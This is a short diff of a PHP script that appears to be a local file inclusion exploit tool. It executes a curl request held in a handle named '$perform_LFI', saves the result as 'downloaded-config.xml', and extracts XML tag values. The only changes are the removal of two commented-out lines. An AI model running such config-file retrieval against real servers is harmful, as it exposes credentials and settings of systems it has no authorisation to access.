@@ -73,7 +73,7 @@ else{
 	if(!curl_exec($perform_LFI)){
 	    die('Error: "' . curl_error($perform_LFI) . '" - Code: ' . curl_errno($perform_LFI));
 	}
-	//echo $result;
+	
 	
 	$filename="downloaded-config.xml";
 	file_put_contents($filename, $result, FILE_APPEND, $context = null);
@@ -104,7 +104,6 @@ else{
 	
 	function filter_tag_value($string, $tagname) {
 	    $pattern = "/<$tagname ?.*>(.*)<\/$tagname>/";
-	    //$pattern = "/<$tagname>([\w\W]*?)<\/$tagname>/";
 	    preg_match($pattern, $string, $matches);
 	    return $matches[1];
 	}
